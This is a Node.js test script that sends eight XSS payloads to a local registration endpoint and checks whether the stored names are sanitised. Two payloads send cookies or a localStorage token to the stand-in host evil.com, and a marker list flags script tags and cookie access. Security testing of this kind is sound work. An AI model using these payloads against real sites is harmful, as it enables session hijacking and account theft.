/**
 * simulate_xss.js
 * Simulates various XSS injection payloads against the registration endpoint.
 *
 * Usage:
 *   node scripts/simulate_xss.js
 *
 * Requirements:
 *   - Server must be running: npm run dev
 */

const REGISTER_URL = 'http://localhost:3000/api/auth/register';

const PAYLOADS = [
  {
    label: 'Classic <script> tag',
    name:  "<script>alert('XSS')</script>",
  },
  {
    label: 'Image onerror handler',
    name:  '<img src=x onerror=alert(1)>',
  },
  {
    label: 'SVG onload handler',
    name:  '<svg onload=alert(1)>',
  },
  {
    label: 'Anchor javascript: URI',
    name:  "<a href='javascript:alert(1)'>click me</a>",
  },
  {
    label: 'Cookie stealer script',
    name:  "<script>document.location='http://evil.com/?c='+document.cookie</script>",
  },
  {
    label: 'Token stealer via fetch',
    name:  "<script>fetch('http://evil.com/?t='+localStorage.getItem('token'))</script>",
  },
  {
    label: 'HTML entity bypass',
    name:  '&lt;script&gt;alert(1)&lt;/script&gt;',
  },
  {
    label: 'Nested tag bypass',
    name:  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  },
];

const DANGEROUS_MARKERS = [
  '<script', '<img', 'onerror', 'onload', 'javascript:', 'document.cookie', 'localStorage',
];

function isDangerous(text) {
  return DANGEROUS_MARKERS.some((marker) => text.includes(marker));
}

async function testPayload(payload, index) {
  const email = `xss_${index}_${Date.now()}@simtest.com`;
  const body  = { email, password: 'SimTest1234', name: payload.name };

  console.log(`\n[Test ${index}] ${payload.label}`);
  console.log(`  Input  : ${payload.name}`);

  try {
    const res  = await fetch(REGISTER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = await res.json();

    if (res.status === 201) {
      const storedName = data?.user?.name ?? 'N/A';
      if (isDangerous(storedName)) {
        console.log(`  Stored : ${storedName}`);
        console.log(`  Result : VULNERABLE ❌  — dangerous content stored in database!`);
        return 'vulnerable';
      } else {
        console.log(`  Stored : ${storedName || '(empty)'}`);
        console.log(`  Result : SAFE ✅  — HTML tags stripped, content is harmless`);
        return 'safe';
      }
    } else if (res.status === 400) {
      const errors = data.errors ?? data.message ?? '';
      console.log(`  Stored : (rejected — never reached database)`);
      console.log(`  Result : SAFE ✅  — blocked by validation: ${JSON.stringify(errors)}`);
      return 'safe';
    } else if (res.status === 429) {
      console.log(`  Result : BLOCKED by rate limiter (429) — wait 60s and retry`);
      return 'rate_limited';
    } else {
      console.log(`  Result : HTTP ${res.status}`);
      return 'unknown';
    }
  } catch (err) {
    console.log(`  Result : ERROR — ${err.message}`);
    return 'error';
  }
}

async function main() {
  console.log('XSS Injection Simulation');
  console.log('='.repeat(65));

  let safe = 0, vulnerable = 0;

  for (let i = 0; i < PAYLOADS.length; i++) {
    const result = await testPayload(PAYLOADS[i], i + 1);
    if (result === 'safe') safe++;
    else if (result === 'vulnerable') vulnerable++;

    // Small delay to avoid hitting rate limiter mid-test
    await new Promise((r) => setTimeout(r, 300));
  }

  console.log('\n' + '='.repeat(65));
  console.log(`FINAL SCORE: ${safe} safe | ${vulnerable} vulnerable`);
  if (vulnerable === 0) {
    console.log('All XSS payloads were neutralised. XSS prevention is WORKING. ✅');
  } else {
    console.log(`WARNING: ${vulnerable} payload(s) stored dangerous content. ❌`);
  }
}

main();
